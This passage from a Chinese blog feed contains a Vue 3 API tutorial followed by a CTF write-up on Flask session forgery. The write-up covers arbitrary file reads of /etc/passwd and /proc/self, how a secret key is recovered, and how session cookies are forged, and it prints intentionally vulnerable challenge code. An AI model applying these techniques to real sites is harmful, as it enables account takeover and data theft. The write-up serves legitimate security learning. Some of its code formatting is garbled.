&#123;id:&#x27;asgdytsa03&#x27;,name:&#x27;红色警戒&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa04&#x27;,name:&#x27;斗罗大陆&#x27;&#125;</span><br><span class="line">        ])</span><br><span class="line">      &lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h1>7. 其它 API</h1><h2 id="7-1-【shallowRef-与-shallowReactive-】">7.1.【shallowRef 与 shallowReactive 】</h2><h3 id="shallowRef"><code>shallowRef</code></h3><ol><li><p>作用：创建一个响应式数据，但只对顶层属性进行响应式处理。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myVar = <span class="title function_">shallowRef</span>(initialValue);</span><br></pre></td></tr></table></figure></li><li><p>特点：只跟踪引用值的变化，不关心值内部的属性变化。</p></li></ol><h3 id="shallowReactive"><code>shallowReactive</code></h3><ol><li><p>作用：创建一个浅层响应式对象，只会使对象的最顶层属性变成响应式的，对象内部的嵌套属性则不会变成响应式的</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> myObj = <span class="title function_">shallowReactive</span>(&#123; ... &#125;);</span><br></pre></td></tr></table></figure></li><li><p>特点：对象的顶层属性是响应式的，但嵌套对象的属性不是。</p></li></ol><h3 id="总结">总结</h3><blockquote><p>通过使用 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowref"><code>shallowRef()</code></a> 和 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreactive"><code>shallowReactive()</code></a> 来绕开深度响应。浅层式 <code>API</code> 创建的状态只在其顶层是响应式的，对所有深层的对象不会做任何处理，避免了对每一个内部属性做响应式所带来的性能成本，这使得属性的访问变得更快，可提升性能。</p></blockquote><h2 id="7-2-【readonly-与-shallowReadonly】">7.2.【readonly 与 shallowReadonly】</h2><h3 id="readonly"><strong><code>readonly</code></strong></h3><ol><li><p>作用：用于创建一个对象的深只读副本。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> readOnlyCopy = <span class="title function_">readonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li>对象的所有嵌套属性都将变为只读。</li><li>任何尝试修改这个对象的操作都会被阻止（在开发模式下，还会在控制台中发出警告）。</li></ul></li><li><p>应用场景：</p><ul><li>创建不可变的状态快照。</li><li>保护全局状态或配置不被修改。</li></ul></li></ol><h3 id="shallowReadonly"><strong><code>shallowReadonly</code></strong></h3><ol><li><p>作用：与 <code>readonly</code> 类似，但只作用于对象的顶层属性。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> shallowReadOnlyCopy = <span class="title function_">shallowReadonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li><p>只将对象的顶层属性设置为只读，对象内部的嵌套属性仍然是可变的。</p></li><li><p>适用于只需保护对象顶层属性的场景。</p></li></ul></li></ol><h2 id="7-3-【toRaw-与-markRaw】">7.3.【toRaw 与 markRaw】</h2><h3 id="toRaw"><code>toRaw</code></h3><ol><li><p>作用：用于获取一个响应式对象的原始对象， <code>toRaw</code> 返回的对象不再是响应式的，不会触发视图更新。</p><blockquote><p>官网描述：这是一个可以用于临时读取而不引起代理访问/跟踪开销，或是写入而不触发更改的特殊方法。不建议保存对原始对象的持久引用，请谨慎使用。</p></blockquote><blockquote><p>何时使用？ —— 在需要将响应式对象传递给非 <code>Vue</code> 的库或外部系统时，使用 <code>toRaw</code> 可以确保它们收到的是普通对象</p></blockquote></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive,toRaw,markRaw,isReactive &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* toRaw */</span></span><br><span class="line"><span class="comment">// 响应式对象</span></span><br><span class="line"><span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;)</span><br><span class="line"><span class="comment">// 原始对象</span></span><br><span class="line"><span class="keyword">let</span> rawPerson = <span class="title function_">toRaw</span>(person)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citysd = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(person))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(rawPerson))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys2))</span><br></pre></td></tr></table></figure></li></ol><h3 id="markRaw"><code>markRaw</code></h3><ol><li><p>作用：标记一个对象，使其<strong>永远不会</strong>变成响应式的。</p><blockquote><p>例如使用<code>mockjs</code>时，为了防止误把<code>mockjs</code>变为响应式对象，可以使用 <code>markRaw</code> 去标记<code>mockjs</code></p></blockquote></li><li><p>编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citys = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br></pre></td></tr></table></figure></li></ol><h2 id="7-4-【customRef】">7.4.【customRef】</h2><p>作用：创建一个自定义的<code>ref</code>，并对其依赖项跟踪和更新触发进行逻辑控制。</p><p>实现防抖效果（<code>useSumRef.ts</code>）：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;customRef &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params">initValue:<span class="built_in">string</span>,delay:<span class="built_in">number</span></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> msg = <span class="title function_">customRef</span>(<span class="function">(<span class="params">track,trigger</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>:<span class="built_in">number</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">track</span>() <span class="comment">// 告诉Vue数据msg很重要，要对msg持续关注，一旦变化就更新</span></span><br><span class="line">        <span class="keyword">return</span> initValue</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          initValue = value</span><br><span class="line">          <span class="title function_">trigger</span>() <span class="comment">//通知Vue数据msg变化了</span></span><br><span class="line">        &#125;, delay);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;) </span><br><span class="line">  <span class="keyword">return</span> &#123;msg&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组件中使用：</p><h1>8. Vue3新组件</h1><h2 id="8-1-【Teleport】">8.1. 【Teleport】</h2><ul><li>什么是Teleport？—— Teleport 是一种能够将我们的<strong>组件html结构</strong>移动到指定位置的技术。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">teleport</span> <span class="attr">to</span>=<span class="string">&#x27;body&#x27;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是一个弹窗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是弹窗中的一些内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isShow = false&quot;</span>&gt;</span>关闭弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">teleport</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-2-【Suspense】">8.2. 【Suspense】</h2><ul><li>等待异步组件时渲染一些额外内容，让应用有更好的用户体验</li><li>使用步骤：<ul><li>异步引入组件</li><li>使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></li></ul></li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineAsyncComponent,<span class="title class_">Suspense</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Child</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">()=&gt;</span><span class="keyword">import</span>(<span class="string">&#x27;./Child.vue&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h3&gt;我是App组件&lt;/h3&gt;</span><br><span class="line">        &lt;Suspense&gt;</span><br><span class="line">          &lt;template v-slot:default&gt;</span><br><span class="line">            &lt;Child/&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template v-slot:fallback&gt;</span><br><span class="line">            &lt;h3&gt;加载中.......&lt;/h3&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Suspense&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="8-3-【全局API转移到应用对象】">8.3.【全局API转移到应用对象】</h2><ul><li><code>app.component</code></li><li><code>app.config</code></li><li><code>app.directive</code></li><li><code>app.mount</code></li><li><code>app.unmount</code></li><li><code>app.use</code></li></ul><h2 id="8-4-【其他】">8.4.【其他】</h2><ul><li><p>过渡类名 <code>v-enter</code> 修改为 <code>v-enter-from</code>、过渡类名 <code>v-leave</code> 修改为 <code>v-leave-from</code>。</p></li><li><p><code>keyCode</code> 作为 <code>v-on</code> 修饰符的支持。</p></li><li><p><code>v-model</code> 指令在组件上的使用已经被重新设计，替换掉了 <code>v-bind.sync。</code></p></li><li><p><code>v-if</code> 和 <code>v-for</code> 在同一个元素身上使用时的优先级发生了变化。</p></li><li><p>移除了<code>$on</code>、<code>$off</code> 和 <code>$once</code> 实例方法。</p></li><li><p>移除了过滤器 <code>filter</code>。</p></li><li><p>移除了<code>$children</code> 实例 <code>propert</code>。</p><p>…</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask之Session伪造</title>
      <link href="/posts/9586a6c4.html"/>
      <url>/posts/9586a6c4.html</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）</span><br><span class="line"></span><br><span class="line">/proc/self</span><br><span class="line">proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline</span><br><span class="line">该文件包含的内容为当前进程执行的命令行参数。</span><br><span class="line"></span><br><span class="line">/proc/self/mem</span><br><span class="line">/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。</span><br><span class="line"></span><br><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</span><br></pre></td></tr></table></figure><h2 id="HCTF-2018-admin-BUUCTF在线评测-buuoj-cn-https-buuoj-cn-challenges-HCTF-2018-admin">[HCTF 2018]admin]([BUUCTF在线评测 (<a href="http://buuoj.cn">buuoj.cn</a>)](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[HCTF 2018]admin))</h2><h2 id="flask-session-伪造">flask session 伪造</h2><h3 id="一、session的作用">一、session的作用</h3><p>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。<br>用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</p><h3 id="二、flask-session的储存方式">二、flask session的储存方式</h3><p>第一种方式：直接存在客户端的cookies中</p><p>第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</p><p>flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</p><h3 id="三、flask的session格式">三、flask的session格式</h3><p>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ(session数据).Y48ncA(时间戳 ).H99Th2w4FzzphEX8qAeiSPuUF_0(签名)              </span><br></pre></td></tr></table></figure><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p><blockquote><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p><p>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p></blockquote><hr><p>[[CISCN2019 华东南赛区]Web41]([BUUCTF在线评测 (<a href="http://buuoj.cn">buuoj.cn</a>)](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[CISCN2019 华东南赛区]Web4))</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><code>/read</code>路径现在已经没什么用处了，这里过滤了<code>flag</code>也就不能直接文件包含读取<code>flag.txt</code>了。<code>/</code>路径是给session字段赋值用户信息的</p></li><li><p>其实<code>/flag</code>字段也很好理解，就是要修改session字段的用户为<code>fuck</code>，只需要抓取<code>/flag</code>的请求包，将其的session字段使用加解密脚本和私钥进行加解密，修改好用户信息之后将新的session字段替换一下，发送包即可得到<code>flag</code>。这道题关键也就在确定<code>python</code>后端，读取<code>/app/app.py</code>的网站源码信息</p></li><li><p>直接读取/flag就行<code>注意这里的waf</code>!</p></li><li><pre><code class="language-python">try:        url = request.args.get('url')        m = re.findall('^file.*', url, re.IGNORECASE)        n = re.findall('flag', url, re.IGNORECASE)        if m or n:            return 'No Hack'<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">4</span>. </span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. !<span class="selector-attr">[image-20240611001721550]</span>(<span class="attribute">https</span>:<span class="comment">//gitee.com/eviden/img/raw/master/image-20240611001721550.png)</span></span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">[XCTF-Web-catcat-new](<span class="attribute">https</span>:<span class="comment">//adworld.xctf.org.cn/)</span></span><br><span class="line"></span><br><span class="line">首先是任意文件读取.</span><br><span class="line"></span><br><span class="line"><span class="built_in">`/proc/self/cmdline`</span>，用于获取当前启动进程的完整命令。</span><br><span class="line"></span><br><span class="line">可知当前应用进程名为app.py</span><br><span class="line"></span><br><span class="line"><span class="built_in">``</span>`python</span><br><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = <span class="built_in">Flask</span>(</span><br><span class="line">    __name__,</span><br><span class="line">    static_url_path=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.<span class="built_in">uuid4</span>()).<span class="built_in">replace</span>(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br><span class="line">if os.path.<span class="built_in">isfile</span>(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) as <span class="attribute">f</span>:</span><br><span class="line">        flag = f.<span class="built_in">read</span>()</span><br><span class="line">    os.<span class="built_in">remove</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.<span class="built_in">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="built_in">index</span>():</span><br><span class="line">    detailtxt = os.<span class="built_in">listdir</span>(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line">    cats_list = []</span><br><span class="line">    for i in <span class="attribute">detailtxt</span>:</span><br><span class="line">        cats_list.<span class="built_in">append</span>(i[:i.<span class="built_in">index</span>(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">    return <span class="built_in">render_template</span>(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.<span class="built_in">route</span>(<span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="built_in">info</span>():</span><br><span class="line">    filename = <span class="string">&quot;./details/&quot;</span> + request.args.<span class="built_in">get</span>(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    start = request.args.<span class="built_in">get</span>(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    end = request.args.<span class="built_in">get</span>(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    name = request.args.<span class="built_in">get</span>(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.<span class="built_in">get</span>(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).<span class="built_in">index</span>(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    return <span class="built_in">render_template</span>(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=<span class="built_in">cat</span>(filename, start, end))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.<span class="built_in">route</span>(<span 